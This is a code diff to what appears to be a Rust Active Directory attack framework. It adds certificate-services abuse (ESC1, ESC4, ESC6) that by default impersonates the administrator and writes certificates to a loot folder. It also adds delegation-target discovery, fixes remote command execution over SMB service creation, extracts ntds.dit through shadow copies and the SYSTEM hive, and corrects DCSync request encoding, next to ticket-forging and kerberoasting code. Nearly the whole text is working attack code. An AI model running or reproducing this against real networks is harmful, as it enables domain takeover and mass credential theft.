@@ -133,6 +133,8 @@ pub async fn execute_step(
             | PlannedAction::EnumerateGroups
             | PlannedAction::EnumerateTrusts
             | PlannedAction::EnumerateGpos
+            | PlannedAction::AdcsEnumerate
+            | PlannedAction::AdcsEsc4 { .. }
     );
     if requires_ldap && !ctx.ldap_available {
         let msg = format!("Skipped: LDAP authentication failed — {}", step.description);
@@ -197,6 +199,18 @@ pub async fn execute_step(
         PlannedAction::Coerce { target, listener } => {
             exec_coerce(ctx, state, target, listener).await
         }
+        PlannedAction::AdcsEnumerate => exec_adcs_enumerate(ctx, state).await,
+        PlannedAction::AdcsEsc1 {
+            template,
+            ca,
+            target_upn,
+        } => exec_adcs_esc1(ctx, state, template, ca, target_upn).await,
+        PlannedAction::AdcsEsc4 { template } => exec_adcs_esc4(ctx, state, template).await,
+        PlannedAction::AdcsEsc6 {
+            template,
+            ca,
+            target_upn,
+        } => exec_adcs_esc6(ctx, state, template, ca, target_upn).await,
         PlannedAction::ForgeGoldenTicket { krbtgt_hash } => {
             exec_golden_ticket(ctx, state, krbtgt_hash).await
         }
@@ -247,29 +261,83 @@ pub async fn execute_step(
 }
 
 // ═══════════════════════════════════════════════════════════
-// Enumeration Executors
+// LDAP Connection Helper
 // ═══════════════════════════════════════════════════════════
 
-async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
-    let (user, pass, _) = ctx.effective_creds();
-    let mut conn = match ldap::LdapSession::connect(
+/// Connect to LDAP using the effective credentials from the ExecContext.
+/// When `use_hash` is true (pass-the-hash mode), LDAP simple bind cannot
+/// work — the password field holds an NT hash, not a cleartext password.
+/// In that case we check for a known cleartext among cracked credentials
+/// or return a clear error instead of sending garbage to the DC.
+async fn ldap_connect(ctx: &ExecContext, state: &EngagementState) -> std::result::Result<ldap::LdapSession, StepResult> {
+    let (user, secret, use_hash) = ctx.effective_creds();
+
+    // If the operator authenticated with an NT hash, LDAP simple bind will
+    // fail.  Try to find a plaintext password for the same account first.
+    let password: String = if use_hash {
+        // Check cracked / known cleartext passwords
+        if let Some(cleartext) = state.cracked.get(user) {
+            debug!("LDAP: using cracked cleartext for {} instead of NT hash", user);
+            cleartext.clone()
+        } else if let Some(cred) = state.credentials.get(user) {
+            if cred.secret_type == SecretType::Password {
+                debug!("LDAP: using stored password for {}", user);
+                cred.secret.clone()
+            } else {
+                return Err(StepResult {
+                    success: false,
+                    output: format!(
+                        "LDAP simple bind requires a password, but only an NT hash is available for '{}'. \
+                         Crack the hash or provide plaintext credentials.",
+                        user
+                    ),
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                });
+            }
+        } else {
+            return Err(StepResult {
+                success: false,
+                output: format!(
+                    "LDAP simple bind cannot authenticate with an NT hash (user: '{}'). \
+                     Use --password or crack the hash first.",
+                    user
+                ),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            });
+        }
+    } else {
+        secret.to_string()
+    };
+
+    match ldap::LdapSession::connect(
         &ctx.dc_ip,
         &ctx.domain,
         user,
-        pass,
+        &password,
         ctx.use_ldaps,
     )
     .await
     {
+        Ok(conn) => Ok(conn),
+        Err(e) => Err(StepResult {
+            success: false,
+            output: format!("LDAP connect failed: {e}"),
+            new_credentials: 0,
+            new_admin_hosts: 0,
+        }),
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// Enumeration Executors
+// ═══════════════════════════════════════════════════════════
+
+async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
+    let mut conn = match ldap_connect(ctx, state).await {
         Ok(c) => c,
-        Err(e) => {
-            return StepResult {
-                success: false,
-                output: format!("LDAP connect failed: {e}"),
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
+        Err(e) => return e,
     };
 
     let ad_users = match conn.enumerate_users().await {
@@ -330,25 +398,9 @@ async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) ->
 }
 
 async fn exec_enumerate_computers(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
-    let (user, pass, _) = ctx.effective_creds();
-    let mut conn = match ldap::LdapSession::connect(
-        &ctx.dc_ip,
-        &ctx.domain,
-        user,
-        pass,
-        ctx.use_ldaps,
-    )
-    .await
-    {
+    let mut conn = match ldap_connect(ctx, state).await {
         Ok(c) => c,
-        Err(e) => {
-            return StepResult {
-                success: false,
-                output: format!("LDAP: {e}"),
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
+        Err(e) => return e,
     };
 
     let ad_computers = match conn.enumerate_computers().await {
@@ -393,6 +445,62 @@ async fn exec_enumerate_computers(ctx: &ExecContext, state: &mut EngagementState
         });
     }
 
+    // ── RBCD target discovery ──
+    // Try to find computers where we may have GenericWrite (RBCD pre-requisite).
+    // Heuristic 1: Computers we created (mS-DS-CreatorSID set → we have full control)
+    // Heuristic 2: Computers with existing msDS-AllowedToActOnBehalfOfOtherIdentity
+    if let Ok(mut rbcd_conn) = ldap_connect(ctx, state).await {
+        let filter = "(&(objectClass=computer)(mS-DS-CreatorSID=*))";
+        if let Ok(entries) = rbcd_conn
+            .custom_search(filter, &["sAMAccountName", "dNSHostName"])
+            .await
+        {
+            for entry in &entries {
+                let host = entry
+                    .attrs
+                    .get("dNSHostName")
+                    .and_then(|v| v.first())
+                    .or_else(|| entry.attrs.get("sAMAccountName").and_then(|v| v.first()))
+                    .cloned()
+                    .unwrap_or_default();
+                if !host.is_empty() {
+                    state.rbcd_targets.push(host.clone());
+                    debug!("  RBCD candidate (creator-owned): {}", host);
+                }
+            }
+        }
+
+        let filter2 = "(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))";
+        if let Ok(entries) = rbcd_conn
+            .custom_search(filter2, &["sAMAccountName", "dNSHostName"])
+            .await
+        {
+            for entry in &entries {
+                let host = entry
+                    .attrs
+                    .get("dNSHostName")
+                    .and_then(|v| v.first())
+                    .or_else(|| entry.attrs.get("sAMAccountName").and_then(|v| v.first()))
+                    .cloned()
+                    .unwrap_or_default();
+                if !host.is_empty() && !state.rbcd_targets.contains(&host) {
+                    state.rbcd_targets.push(host.clone());
+                    debug!("  RBCD candidate (existing delegation): {}", host);
+                }
+            }
+        }
+
+        let _ = rbcd_conn.disconnect().await;
+
+        if !state.rbcd_targets.is_empty() {
+            info!(
+                "  {} {} RBCD-writable computer(s) identified",
+                "⚠".yellow(),
+                state.rbcd_targets.len()
+            );
+        }
+    }
+
     let msg = format!(
         "Enumerated {} computers ({} DCs, {} unconstrained)",
         state.computers.len(),
@@ -409,25 +517,9 @@ async fn exec_enumerate_computers(ctx: &ExecContext, state: &mut EngagementState
 }
 
 async fn exec_enumerate_groups(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
-    let (user, pass, _) = ctx.effective_creds();
-    let mut conn = match ldap::LdapSession::connect(
-        &ctx.dc_ip,
-        &ctx.domain,
-        user,
-        pass,
-        ctx.use_ldaps,
-    )
-    .await
-    {
+    let mut conn = match ldap_connect(ctx, state).await {
         Ok(c) => c,
-        Err(e) => {
-            return StepResult {
-                success: false,
-                output: format!("{e}"),
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
+        Err(e) => return e,
     };
 
     let ad_groups = match conn.enumerate_groups().await {
@@ -460,26 +552,10 @@ async fn exec_enumerate_groups(ctx: &ExecContext, state: &mut EngagementState) -
     }
 }
 
-async fn exec_enumerate_trusts(ctx: &ExecContext, _state: &mut EngagementState) -> StepResult {
-    let (user, pass, _) = ctx.effective_creds();
-    let mut conn = match ldap::LdapSession::connect(
-        &ctx.dc_ip,
-        &ctx.domain,
-        user,
-        pass,
-        ctx.use_ldaps,
-    )
-    .await
-    {
+async fn exec_enumerate_trusts(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
+    let mut conn = match ldap_connect(ctx, state).await {
         Ok(c) => c,
-        Err(e) => {
-            return StepResult {
-                success: false,
-                output: format!("LDAP: {e}"),
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
+        Err(e) => return e,
     };
 
     let trusts = match conn.enumerate_trusts().await {
@@ -526,26 +602,10 @@ async fn exec_enumerate_trusts(ctx: &ExecContext, _state: &mut EngagementState) 
     }
 }
 
-async fn exec_enumerate_gpos(ctx: &ExecContext, _state: &mut EngagementState) -> StepResult {
-    let (user, pass, _) = ctx.effective_creds();
-    let mut conn = match ldap::LdapSession::connect(
-        &ctx.dc_ip,
-        &ctx.domain,
-        user,
-        pass,
-        ctx.use_ldaps,
-    )
-    .await
-    {
+async fn exec_enumerate_gpos(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
+    let mut conn = match ldap_connect(ctx, state).await {
         Ok(c) => c,
-        Err(e) => {
-            return StepResult {
-                success: false,
-                output: format!("LDAP: {e}"),
-                new_credentials: 0,
-                new_admin_hosts: 0,
-            };
-        }
+        Err(e) => return e,
     };
 
     // Query groupPolicyContainer objects
@@ -703,12 +763,20 @@ async fn exec_kerberoast(
 
     let mut hash_count = 0;
     for account in &targets {
-        // Look up real SPNs from LDAP enumeration; fall back to constructed SPN
-        let spns = state
-            .spn_map
-            .get(account)
-            .cloned()
-            .unwrap_or_else(|| vec![format!("MSSQLSvc/{account}")]);
+        // Look up real SPNs from LDAP enumeration
+        let spns = match state.spn_map.get(account) {
+            Some(s) if !s.is_empty() => s.clone(),
+            _ => {
+                // No SPNs discovered for this account — skip rather than
+                // fabricating a fake SPN that will always fail.
+                debug!(
+                    "  {} {} has no SPNs in spn_map, skipping",
+                    "→".dimmed(),
+                    account
+                );
+                continue;
+            }
+        };
 
         for spn in &spns {
             match kerberos::kerberoast(&ctx.dc_ip, &tgt, spn).await {
@@ -866,25 +934,12 @@ async fn exec_rbcd(
 ) -> StepResult {
     let hunt_config = ctx.to_hunt_config();
 
-    // Resolve controlled account's SID from LDAP enumeration data
-    // The SID is discovered during the enumeration phase
     // Resolve controlled account's SID from LDAP
     let controlled_sid = {
-        let (user, pass, _) = ctx.effective_creds();
-        let mut conn =
-            match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps)
-                .await
-            {
-                Ok(c) => c,
-                Err(e) => {
-                    return StepResult {
-                        success: false,
-                        output: format!("LDAP connect failed: {e}"),
-                        new_credentials: 0,
-                        new_admin_hosts: 0,
-                    };
-                }
-            };
+        let mut conn = match ldap_connect(ctx, state).await {
+            Ok(c) => c,
+            Err(e) => return e,
+        };
 
         let filter = format!(
             "(sAMAccountName={})",
@@ -907,15 +962,25 @@ async fn exec_rbcd(
         };
         let _ = conn.disconnect().await;
 
-        results
+        match results
             .first()
             .and_then(|entry| entry.bin_attrs.get("objectSid"))
             .and_then(|sids| sids.first())
             .map(|bytes| parse_sid_bytes(bytes))
-            .unwrap_or_else(|| {
-                warn!("Could not resolve SID for {}, RBCD will fail", controlled);
-                "S-1-5-21-0-0-0-0".to_string()
-            })
+        {
+            Some(sid) => sid,
+            None => {
+                return StepResult {
+                    success: false,
+                    output: format!(
+                        "Could not resolve objectSid for '{}' via LDAP — RBCD requires a valid SID",
+                        controlled
+                    ),
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                };
+            }
+        }
     };
 
     let rc = RbcdConfig {
@@ -1091,6 +1156,394 @@ async fn exec_coerce(
 // Password Spray
 // ═══════════════════════════════════════════════════════════
 
+// ── ADCS Executor Functions ──
+
+async fn exec_adcs_enumerate(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
+    let conn = match ldap_connect(ctx, state).await {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let mut enumerator = overthrone_core::adcs::LdapAdcsEnumerator::new(conn);
+
+    let templates = match enumerator.enumerate_templates().await {
+        Ok(t) => t,
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("Template enum: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
+    };
+
+    let cas = match enumerator.enumerate_cas().await {
+        Ok(c) => c,
+        Err(e) => {
+            warn!("CA enumeration failed: {e}");
+            vec![]
+        }
+    };
+
+    // Identify vulnerable templates
+    let mut vuln_templates = Vec::new();
+    for t in &templates {
+        if let Some(esc_num) = t.esc_vulnerability() {
+            info!(
+                "  {} ESC{}: {} ({})",
+                "⚠".yellow(),
+                esc_num,
+                t.name.bold(),
+                t.display_name
+            );
+            vuln_templates.push((esc_num, t.name.clone()));
+        }
+    }
+
+    let msg = format!(
+        "ADCS: {} templates, {} CAs, {} vulnerable ({})",
+        templates.len(),
+        cas.len(),
+        vuln_templates.len(),
+        vuln_templates
+            .iter()
+            .map(|(e, n)| format!("ESC{}:{}", e, n))
+            .collect::<Vec<_>>()
+            .join(", ")
+    );
+    info!("{} {}", "  ✓".green(), msg);
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
+}
+
+async fn exec_adcs_esc1(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    template: &str,
+    ca: &str,
+    target_upn: &str,
+) -> StepResult {
+    // Auto-discover template + CA if not specified
+    let (real_template, real_ca, real_upn) = match resolve_adcs_params(ctx, state, template, ca, target_upn).await {
+        Ok(params) => params,
+        Err(msg) => {
+            return StepResult {
+                success: false,
+                output: msg,
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
+    };
+
+    let ca_server = real_ca.split('\\').next_back().unwrap_or(&real_ca);
+    let exploiter = match overthrone_core::adcs::Esc1Exploiter::new(ca_server) {
+        Ok(e) => e,
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("ESC1 init: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
+    };
+
+    match exploiter.exploit(&real_template, &real_upn, None).await {
+        Ok(cert) => {
+            info!(
+                "  {} ESC1 cert issued: {} (thumbprint: {})",
+                "✓".green(),
+                cert.template.bold(),
+                cert.thumbprint.cyan()
+            );
+
+            // Save PFX
+            let pfx_path = format!("./loot/esc1_{}.pfx", real_upn.replace('@', "_"));
+            let _ = tokio::fs::write(&pfx_path, &cert.pfx_data).await;
+
+            // Register the impersonated user as a credential
+            let username = real_upn.split('@').next().unwrap_or(&real_upn).to_string();
+            state.add_credential(CompromisedCred {
+                username: username.clone(),
+                secret: format!("pfx:{}", pfx_path),
+                secret_type: SecretType::Ticket,
+                source: "adcs_esc1".to_string(),
+                is_admin: username.to_lowercase() == "administrator",
+                admin_on: vec![],
+            });
+
+            if username.to_lowercase() == "administrator" {
+                state.has_domain_admin = true;
+                state.da_user = Some(username.clone());
+            }
+
+            let msg = format!(
+                "ESC1: Certificate for {} via template {} ({} bytes PFX)",
+                real_upn,
+                real_template,
+                cert.pfx_data.len()
+            );
+            StepResult {
+                success: true,
+                output: msg,
+                new_credentials: 1,
+                new_admin_hosts: if username.to_lowercase() == "administrator" {
+                    1
+                } else {
+                    0
+                },
+            }
+        }
+        Err(e) => StepResult {
+            success: false,
+            output: format!("ESC1 failed: {e}"),
+            new_credentials: 0,
+            new_admin_hosts: 0,
+        },
+    }
+}
+
+async fn exec_adcs_esc4(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    template: &str,
+) -> StepResult {
+    // Find a writable template via ADCS LDAP enum
+    let real_template = if template.is_empty() {
+        let conn = match ldap_connect(ctx, state).await {
+            Ok(c) => c,
+            Err(e) => return e,
+        };
+        let mut enumerator = overthrone_core::adcs::LdapAdcsEnumerator::new(conn);
+        let templates = enumerator.enumerate_templates().await.unwrap_or_default();
+        // ESC4 = template where we have write access but it's not already ESC1-vuln
+        // Use esc_vulnerability() == Some(4) as indicator
+        match templates.iter().find(|t| t.esc_vulnerability() == Some(4)) {
+            Some(t) => t.name.clone(),
+            None => {
+                return StepResult {
+                    success: false,
+                    output: "No writable templates found for ESC4".to_string(),
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                };
+            }
+        }
+    } else {
+        template.to_string()
+    };
+
+    let (user, _pass, _) = ctx.effective_creds();
+    let mut target = overthrone_core::adcs::Esc4Target::new(
+        &real_template,
+        &ctx.domain,
+        user,
+    );
+
+    // Resolve template DN via LDAP
+    let mut conn = match ldap_connect(ctx, state).await {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let base_dn = ctx.base_dn();
+    match target.execute(&mut conn, &base_dn).await {
+        Ok(()) => {
+            info!(
+                "  {} ESC4: Template {} modified for ESC1 exploitation",
+                "✓".green(),
+                real_template.bold()
+            );
+
+            // Now try ESC1 with the modified template
+            let esc1_result =
+                exec_adcs_esc1(ctx, state, &real_template, "", "").await;
+
+            // Restore the template
+            if let Err(e) = target.restore(&mut conn, None).await {
+                warn!("ESC4 template restore failed: {e}");
+            } else {
+                info!("  {} Template {} restored", "✓".green(), real_template);
+            }
+
+            let _ = conn.disconnect().await;
+            esc1_result
+        }
+        Err(e) => {
+            let _ = conn.disconnect().await;
+            StepResult {
+                success: false,
+                output: format!("ESC4 template modification failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            }
+        }
+    }
+}
+
+async fn exec_adcs_esc6(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    template: &str,
+    ca: &str,
+    target_upn: &str,
+) -> StepResult {
+    let (real_template, real_ca, real_upn) = match resolve_adcs_params(ctx, state, template, ca, target_upn).await {
+        Ok(params) => params,
+        Err(msg) => {
+            return StepResult {
+                success: false,
+                output: msg,
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
+    };
+
+    // Use any template with Client Auth EKU (not just ESC1-vulnerable ones)
+    let ca_server = real_ca.split('\\').next_back().unwrap_or(&real_ca);
+    let exploiter = match overthrone_core::adcs::Esc6Exploiter::new(ca_server) {
+        Ok(e) => e,
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("ESC6 init: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
+    };
+
+    // Check if CA is vulnerable first
+    match exploiter.check_vulnerable().await {
+        Ok(true) => {
+            info!("  {} CA {} has EDITF_ATTRIBUTESUBJECTALTNAME2", "⚠".yellow(), ca_server);
+        }
+        Ok(false) => {
+            return StepResult {
+                success: false,
+                output: format!("CA {} is not ESC6-vulnerable", ca_server),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
+        Err(e) => {
+            warn!("ESC6 vuln check failed (trying anyway): {e}");
+        }
+    }
+
+    match exploiter.exploit(&real_template, &real_upn).await {
+        Ok(cert) => {
+            let pfx_path = format!("./loot/esc6_{}.pfx", real_upn.replace('@', "_"));
+            let _ = tokio::fs::write(&pfx_path, &cert.pfx_data).await;
+
+            let username = real_upn.split('@').next().unwrap_or(&real_upn).to_string();
+            state.add_credential(CompromisedCred {
+                username: username.clone(),
+                secret: format!("pfx:{}", pfx_path),
+                secret_type: SecretType::Ticket,
+                source: "adcs_esc6".to_string(),
+                is_admin: username.to_lowercase() == "administrator",
+                admin_on: vec![],
+            });
+
+            if username.to_lowercase() == "administrator" {
+                state.has_domain_admin = true;
+                state.da_user = Some(username.clone());
+            }
+
+            let msg = format!(
+                "ESC6: Certificate for {} via SAN attribute injection ({} bytes PFX)",
+                real_upn,
+                cert.pfx_data.len()
+            );
+            info!("{} {}", "  ✓".green(), msg);
+            StepResult {
+                success: true,
+                output: msg,
+                new_credentials: 1,
+                new_admin_hosts: if username.to_lowercase() == "administrator" {
+                    1
+                } else {
+                    0
+                },
+            }
+        }
+        Err(e) => StepResult {
+            success: false,
+            output: format!("ESC6 failed: {e}"),
+            new_credentials: 0,
+            new_admin_hosts: 0,
+        },
+    }
+}
+
+/// Auto-discover ADCS parameters (template, CA, target UPN) from LDAP
+async fn resolve_adcs_params(
+    ctx: &ExecContext,
+    state: &EngagementState,
+    template: &str,
+    ca: &str,
+    target_upn: &str,
+) -> std::result::Result<(String, String, String), String> {
+    let real_upn = if target_upn.is_empty() {
+        format!("administrator@{}", ctx.domain)
+    } else {
+        target_upn.to_string()
+    };
+
+    if !template.is_empty() && !ca.is_empty() {
+        return Ok((template.to_string(), ca.to_string(), real_upn));
+    }
+
+    // Auto-discover via LDAP
+    let conn = ldap_connect(ctx, state).await.map_err(|e| e.output)?;
+    let mut enumerator = overthrone_core::adcs::LdapAdcsEnumerator::new(conn);
+
+    let real_template = if template.is_empty() {
+        let templates = enumerator
+            .enumerate_templates()
+            .await
+            .map_err(|e| format!("Template enum: {e}"))?;
+        // Prefer ESC1-vulnerable templates
+        match templates.iter().find(|t| t.esc_vulnerability() == Some(1)) {
+            Some(t) => t.name.clone(),
+            None => {
+                // Fall back to any template with Client Auth EKU and enrollee-supplies-subject
+                match templates.iter().find(|t| t.allows_enrollee_subject()) {
+                    Some(t) => t.name.clone(),
+                    None => return Err("No exploitable certificate templates found".to_string()),
+                }
+            }
+        }
+    } else {
+        template.to_string()
+    };
+
+    let real_ca = if ca.is_empty() {
+        let cas = enumerator
+            .enumerate_cas()
+            .await
+            .map_err(|e| format!("CA enum: {e}"))?;
+        match cas.first() {
+            Some(c) => c.name.clone(),
+            None => return Err("No Certificate Authorities discovered".to_string()),
+        }
+    } else {
+        ca.to_string()
+    };
+
+    Ok((real_template, real_ca, real_upn))
+}
+
+// ═══════════════════════════════════════════════════════════
+
 async fn exec_password_spray(
     ctx: &ExecContext,
     state: &mut EngagementState,
@@ -1203,8 +1656,10 @@ async fn exec_remote(
     };
 
     // Build service command that writes output to a temp file
-    let output_file = format!("C:\\{:08x}.tmp", rand::random::<u32>());
-    let svc_cmd = format!("%COMSPEC% /Q /c {} > {} 2>&1", command, output_file);
+    // Write to %SYSTEMROOT%\Temp so we can read via ADMIN$ share consistently
+    let output_hex = format!("{:08x}", rand::random::<u32>());
+    let output_path = format!("C:\\Windows\\Temp\\{}.tmp", output_hex);
+    let svc_cmd = format!("%COMSPEC% /Q /c {} > {} 2>&1", command, output_path);
 
     // Create service via svcctl pipe
     let svc_name = format!("OT{:08X}", rand::random::<u32>());
@@ -1213,20 +1668,16 @@ async fn exec_remote(
             // Wait for execution
             tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
 
-            // Read output
-            let output = match smb
-                .read_file("ADMIN$", &format!("Temp\\{}.tmp", &output_file[3..11]))
-                .await
-            {
+            // Read output — ADMIN$ maps to C:\Windows, so Temp\{hex}.tmp
+            let share_path = format!("Temp\\{}.tmp", output_hex);
+            let output = match smb.read_file("ADMIN$", &share_path).await {
                 Ok(data) => String::from_utf8_lossy(&data).to_string(),
                 Err(_) => "(output not captured)".to_string(),
             };
 
             // Cleanup — delete service & output file
             let _ = delete_service(&smb, &svc_name).await;
-            let _ = smb
-                .delete_file("ADMIN$", &format!("Temp\\{}.tmp", &output_file[3..11]))
-                .await;
+            let _ = smb.delete_file("ADMIN$", &share_path).await;
 
             state.admin_hosts.insert(target.to_string());
             let msg = format!(
@@ -1549,9 +2000,25 @@ async fn exec_dump(
             let vss_result = exec_remote(ctx, state, target, vss_cmd, "smbexec").await;
 
             if vss_result.success {
-                // Parse shadow copy path from output and copy NTDS.dit
-                let copy_cmd = "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\ntds.tmp 2>&1";
-                let _ = exec_remote(ctx, state, target, copy_cmd, "smbexec").await;
+                // Parse shadow copy device path from vssadmin output
+                // Output contains: "Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN"
+                let shadow_device = vss_result
+                    .output
+                    .lines()
+                    .find(|line| line.contains("HarddiskVolumeShadowCopy"))
+                    .and_then(|line| {
+                        // Extract the \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN path
+                        line.split_whitespace()
+                            .find(|w| w.contains("HarddiskVolumeShadowCopy"))
+                            .map(|s| s.trim())
+                    })
+                    .unwrap_or("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1");
+
+                let copy_cmd = format!(
+                    "copy {}\\Windows\\NTDS\\ntds.dit C:\\ntds.tmp 2>&1",
+                    shadow_device
+                );
+                let _ = exec_remote(ctx, state, target, &copy_cmd, "smbexec").await;
 
                 // Also need SYSTEM hive for boot key
                 let reg_cmd = "reg save HKLM\\SYSTEM C:\\system.save /y 2>&1";
@@ -1959,8 +2426,8 @@ async fn exec_dcsync(
     gnc_stub.extend_from_slice(&8u32.to_le_bytes()); // dwInVersion = 8
     // DRS_MSG_GETCHGREQ_V8 — for EXOP_REPL_OBJ single-object DCSync,
     // zero USN vectors and NULL pUpToDateVecDest are correct (request all data).
-    // Full forest replication would need populated DSNAME, USN_VECTOR, UPTODATE_VECTOR_V2.
-    gnc_stub.extend_from_slice(&ndr_conformant_string(&target_dn)); // NC DN
+    // The pNC field is a pointer to DSNAME structure (not an NDR conformant string).
+    gnc_stub.extend_from_slice(&build_dsname(&target_dn)); // pNC → DSNAME
     gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // usnvecFrom.usnHighObjUpdate
     gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // usnvecFrom.usnHighPropUpdate
     gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // pUpToDateVecDest (NULL)
@@ -2141,6 +2608,41 @@ fn build_drs_extensions() -> Vec<u8> {
     ext
 }
 
+/// Build a DSNAME structure for DRS_MSG_GETCHGREQ_V8.
+/// Wire format: NDR referent pointer + embedded DSNAME:
+///   4 bytes referentId
+///   4 bytes structLen (total DSNAME size excluding padding)
+///   4 bytes SidLen (0 — we don't know the NC SID)
+///  16 bytes Guid (zeroed — the DC resolves from the DN)
+///   4 bytes (padding/SID — empty)
+///   N*2 bytes UTF-16LE string name (null-terminated)
+///   4 bytes NDR max_count at top of the conformant array
+fn build_dsname(dn: &str) -> Vec<u8> {
+    let utf16: Vec<u16> = dn.encode_utf16().chain(std::iter::once(0u16)).collect();
+    let name_bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
+    // structLen = 28 (fixed header) + name_bytes.len()
+    let struct_len = 28u32 + name_bytes.len() as u32;
+    let char_count = utf16.len() as u32;
+
+    let mut buf = Vec::new();
+    // NDR unique pointer (referent ID)
+    buf.extend_from_slice(&0x00020004u32.to_le_bytes());
+    // Conformant max_count for the Name[] array
+    buf.extend_from_slice(&char_count.to_le_bytes());
+    // DSNAME fixed fields
+    buf.extend_from_slice(&struct_len.to_le_bytes()); // structLen
+    buf.extend_from_slice(&0u32.to_le_bytes()); // SidLen = 0
+    buf.extend_from_slice(&[0u8; 16]); // Guid = GUID_NULL (DC resolves from DN)
+    buf.extend_from_slice(&[0u8; 28]); // Sid (NT4_ACCOUNT_NAME_LENGTH zero bytes)
+    buf.extend_from_slice(&char_count.to_le_bytes()); // NameLen (wchar count, incl NUL)
+    buf.extend_from_slice(&name_bytes); // Name[] UTF-16LE
+    // Pad to 4-byte boundary
+    while buf.len() % 4 != 0 {
+        buf.push(0);
+    }
+    buf
+}
+
 // ═══════════════════════════════════════════════════════════
 // Ticket Forging Executors
 // ═══════════════════════════════════════════════════════════
@@ -2156,21 +2658,10 @@ async fn exec_golden_ticket(
     // Requires: krbtgt NTLM hash, domain SID, domain name
     // Resolve domain SID from LDAP (query the domain root object)
     let domain_sid = {
-        let (user, pass, _) = ctx.effective_creds();
-        let mut conn =
-            match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps)
-                .await
-            {
-                Ok(c) => c,
-                Err(e) => {
-                    return StepResult {
-                        success: false,
-                        output: format!("LDAP: {e}"),
-                        new_credentials: 0,
-                        new_admin_hosts: 0,
-                    };
-                }
-            };
+        let mut conn = match ldap_connect(ctx, state).await {
+            Ok(c) => c,
+            Err(e) => return e,
+        };
 
         let results = match conn
             .custom_search("(objectClass=domain)", &["objectSid"])
@@ -2292,21 +2783,10 @@ async fn exec_silver_ticket(
 
     // Resolve domain SID from LDAP (query the domain root object)
     let domain_sid = {
-        let (user, pass, _) = ctx.effective_creds();
-        let mut conn =
-            match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps)
-                .await
-            {
-                Ok(c) => c,
-                Err(e) => {
-                    return StepResult {
-                        success: false,
-                        output: format!("LDAP: {e}"),
-                        new_credentials: 0,
-                        new_admin_hosts: 0,
-                    };
-                }
-            };
+        let mut conn = match ldap_connect(ctx, state).await {
+            Ok(c) => c,
+            Err(e) => return e,
+        };
 
         let results = match conn
             .custom_search("(objectClass=domain)", &["objectSid"])
@@ -2489,13 +2969,16 @@ async fn exec_crack_hashes(
     }
 }
 
-/// Check if a tool is available in PATH
+/// Check if a tool is available in PATH (cross-platform)
 async fn which_tool(name: &str) -> bool {
-    tokio::process::Command::new("which")
+    let cmd = if cfg!(windows) { "where.exe" } else { "which" };
+    tokio::process::Command::new(cmd)
         .arg(name)
-        .output()
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .status()
         .await
-        .map(|o| o.status.success())
+        .map(|s| s.success())
         .unwrap_or(false)
 }
 
